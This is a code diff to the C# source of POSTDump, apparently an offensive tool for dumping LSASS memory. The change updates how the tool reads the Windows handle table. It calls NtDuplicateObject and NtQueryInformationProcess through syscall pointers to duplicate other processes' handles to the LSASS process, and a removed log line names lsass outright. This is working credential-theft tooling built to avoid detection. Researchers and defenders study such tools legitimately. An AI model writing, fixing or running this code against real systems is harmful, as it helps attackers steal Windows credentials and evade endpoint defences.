@@ -2,6 +2,8 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using static POSTMiniDump.Data;
+using static POSTMiniDump.Modules;
 using Data = POSTMiniDump.Data;
 
 namespace POSTDump
@@ -343,27 +345,34 @@ namespace POSTDump
             return handleTableInformation;
         }
 
-        private static List<SYSTEM_HANDLE> GetProcHandles(int pid, IntPtr handletableinfo)
+        private static List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> GetProcHandles(int pid, IntPtr handletableinfo)
         {
-            int lHandleCount = Marshal.ReadInt32(handletableinfo);
-            IntPtr ipHandle = new IntPtr(handletableinfo.ToInt64() + 8);
-            SYSTEM_HANDLE shHandle;
-            List<SYSTEM_HANDLE> lstprochandles = new List<SYSTEM_HANDLE>();
+            var result = new List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>();
 
-            for (int lIndex = 0; lIndex < lHandleCount; lIndex++)
+            // NumberOfHandles (first field)
+            long handleCount = IntPtr.Size == 8
+                ? Marshal.ReadInt64(handletableinfo)
+                : Marshal.ReadInt32(handletableinfo);
+
+            // pointer to first handle entry
+            IntPtr entryPtr = IntPtr.Add(handletableinfo, IntPtr.Size * 2);
+
+            int entrySize = Marshal.SizeOf<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>();
+
+            for (long i = 0; i < handleCount; i++)
             {
-                shHandle = new SYSTEM_HANDLE();
-                shHandle = (SYSTEM_HANDLE)Marshal.PtrToStructure(ipHandle, shHandle.GetType());
-                ipHandle = new IntPtr(ipHandle.ToInt64() + Marshal.SizeOf(typeof(SYSTEM_HANDLE)) + 8);
+                var entry = Marshal.PtrToStructure<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>(entryPtr);
 
-                if (shHandle.ProcessID == pid && shHandle.ObjectTypeNumber == 0x7)
+                if ((int)entry.UniqueProcessId == pid)
                 {
-                    lstprochandles.Add(shHandle);
+                    // optional filter (0x7 is not reliable across Win11 builds)
+                    result.Add(entry);
                 }
 
+                entryPtr = IntPtr.Add(entryPtr, entrySize);
             }
 
-            return lstprochandles;
+            return result;
         }
 
         public static List<IntPtr> FindDupHandles(int pid)
@@ -371,7 +380,7 @@ namespace POSTDump
             //Get all needed function pointer
             NtDuplicateObject NTDO = (NtDuplicateObject)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtDuplicateObject"), typeof(NtDuplicateObject));
             NtOpenProcess NTOP = (NtOpenProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.ntopenptr, typeof(NtOpenProcess));
-            POSTMiniDump.Modules.NtQueryInformationProcess NTQP = (POSTMiniDump.Modules.NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtQueryInformationProcess"), typeof(POSTMiniDump.Modules.NtQueryInformationProcess));
+            NtQueryInformationProcess NTQP = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(Postdump.isyscall.GetSyscallPtr("NtQueryInformationProcess"), typeof(NtQueryInformationProcess));
             NtClose NTC = (NtClose)Marshal.GetDelegateForFunctionPointer(POSTDump.Postdump.isyscall.ntcloseptr, typeof(NtClose));
 
             IntPtr hProcess = IntPtr.Zero;
@@ -379,9 +388,9 @@ namespace POSTDump
             List<IntPtr> hDupList = new List<IntPtr>();
             Data.OBJECT_ATTRIBUTES oa = new Data.OBJECT_ATTRIBUTES();
             Data.CLIENT_ID ci = new Data.CLIENT_ID();
-            List<SYSTEM_HANDLE> lstHandles;
+            List<Data.SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> lstHandles;
 
-            IntPtr HandleTableInfo = GetInformationTable(0x10);
+            IntPtr HandleTableInfo = GetInformationTable(0x40);
 
             //Get all running processes
             Process[] processCollection = Process.GetProcesses();
@@ -402,15 +411,15 @@ namespace POSTDump
                     //Parse each handle of this process
                     foreach (var item in lstHandles)
                     {
-                        if (item.ProcessID == p.Id)
+                        if ((int)item.UniqueProcessId == p.Id)
                         {
-                            Data.NTSTATUS rez = NTDO(hProcess, (IntPtr)item.Handle, (IntPtr)(-1), out hDup, 0, 0, 0x00000002); //DUPLICATE_SAME_ACCESS
+                            Data.NTSTATUS rez = NTDO(hProcess, (IntPtr)item.HandleValue, (IntPtr)(-1), out hDup, 0, 0, 0x00000002); //DUPLICATE_SAME_ACCESS
                             if (rez != Data.NTSTATUS.Success)
                                 continue;
 
                             Data.PROCESSINFOCLASS pic = new Data.PROCESSINFOCLASS();
                             Data.PROCESS_BASIC_INFORMATION pbi = new Data.PROCESS_BASIC_INFORMATION();
-                            pbi.UniqueProcessId = (UIntPtr)0;
+                            pbi.UniqueProcessId = (IntPtr)0;
                             int psize = 0;
                             rez = NTQP(hDup, pic, out pbi, Marshal.SizeOf(pbi), out psize);
                             if (rez != Data.NTSTATUS.Success)
@@ -421,7 +430,7 @@ namespace POSTDump
 
                             if ((int)pbi.UniqueProcessId == pid)
                             {
-                                Console.WriteLine($"Found lsass handle 0x{item.Handle.ToString("X")} on {p.Id} ({p.ProcessName})");
+                                Console.WriteLine($"[+] Found handle 0x{item.HandleValue.ToString("X")} on {p.Id} ({p.ProcessName})");
                                 hDupList.Add(hDup);
                             }
                             else
